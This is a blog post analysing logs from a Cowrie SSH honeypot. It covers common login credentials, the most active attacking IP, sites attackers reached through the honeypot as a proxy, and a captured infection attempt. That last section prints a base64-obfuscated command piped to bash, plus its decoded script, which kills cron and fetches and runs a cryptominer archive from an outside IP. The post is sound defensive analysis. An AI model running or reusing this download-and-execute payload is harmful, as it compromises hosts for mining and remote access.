---
layout: post
title:  "Analyzing Honey Pot data"
---
We are going to look through the honey pot data from ```6-4-2019 - 6-13-2019```. I set up a simple honeypot using [Cowrie](https://github.com/cowrie/cowrie). Setting up the honey pot was pretty easy.  I choose this honey pot becuase it had a large following and a bunch of features. Instead of using the suggested output organizer, I have been exporting the logs to my pc every morning and then using ruby scripts I wrote to parse the data.

## Attempted Logins Stats

In Figure 1 we can see that there was a staggering 44k logins with the username ```ruby root```. Which makes sense because a attacker would want root access to the machine so they could bascily do anything they want with the machine. 
![Top to usernames](https://i.imgur.com/hFOtHSN.png=100x20)<br>
Figure 1, Top 10 Username logins

In Figure 1, there was 44,014 logins for root but in Figure 2, there was 44,030 password logins using ```admin```. All the passwords used are common passwords that would be found in a password list. With the expection of password ``` usuario```. After some Googling I found out that it is spanish for ```user```. 
![Top 10 Passwords](https://i.imgur.com/M6kF6cG.png=100x20)<br>
Figure 2. Top 10 Password logins


## Most active IP

In Figure 3, I calculated the most active Ip. This was the Ip that was found the most. We can see that the most active IP is ```58.59.2.26```. That IP was found 199 times. 

![Mot-Active-Ip](https://i.imgur.com/M6kF6cG.png=100x20)<br>
Figure 3, Most Active IP

In Figure 4, I did some research about the IP. The IP is from a Chinese ISP named ```China Telecom Shandong```

![IP-Lookup-58.59.2.26](https://i.imgur.com/AOIiK0Q.png=100x20)<br>
 Ip information for 58.59.2.26<br>
 
 In Figure, 5 is a picture of all the commands that the attacker used on the honeypot.
 
 ![commands-used-by-58.59.2.26](https://i.imgur.com/XOaWK3l.png=100x20)<br>
 Figure 5, List of commands used by 58.59.2.26<br>
 
 It looks like the attacker where just getting information about the box. They did not download or execute anything that would infect or own the system. 

## Other activities 
What I found intresting is that a couple of attackers tired to use it as a proxy. They would request a bunch of sites, mostly cryptocurrency, popular sites such as netflix. But they also where targeting Gift Cards balance checking sites. Some of the sites they tired to use are listed bellow.

```ruby
amidacarecard.com
ya.ru
www.onevanilla.com
www.myvanillabalance.com
chekfast.zennolab.com
www.palotterygiftcard.com
www.mybalancenow.com
www.alabamagiftcard.com
www.wellnesshealthvisacard.com
www.essilorrebatecard.com
www.cfnarewardcard.com
services.incommgateway.com
heck2.zennolab.com
www.pizzahut.com
order.dominos.com
chaturbate.com
www.nrpcard.com
api.bjs.com
www.essilorrebatecard.com
gc.mallofamerica.com
www.mybalancenow.com
google.com
www.google.ca
www.facebook.com
www.pof.com
paxful.com
www.dell.com
www.netflix.com
www.instagram.com
www.pof.de
www.ourtime.com
www.match.com
www.kraken.com
www.footlocker.com
kith.com
```



# Malware infection attempt

I wrote a different  post that goes into more details. But when I was viewing the logs I noticed a long string that looks like a base64 string. The base64 encoded string looked like this:
```ruby 
cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw\">.threatstackcloudsecops; base64 --decode .threatstackcloudsecops | bash
```
When ran it will download and execute a miner. But it will also add their ssh key to the ```.ssh``` directory. The malware also sets up a hidden SSH sever that allows the attckers to login. Below is the decoded base64 string.
``ruby
#!/bin/bash
cd /tmp
rm -rf .X15-unix
mkdir .X15-unix
cd .X15-unix
pkill -9 cron > .out
wget -q http://54.37.70.249/dota2.tar.gz || curl -O -f http://54.37.70.249/dota2.tar.gz
sleep 7s && tar xf dota2.tar.gz
#rm -rf dota2.tar.gz
cd .rsync
chmod 777 *
cd /tmp/.X15-unix/.rsync/a && ./cron || ./anacron
exit 0
```
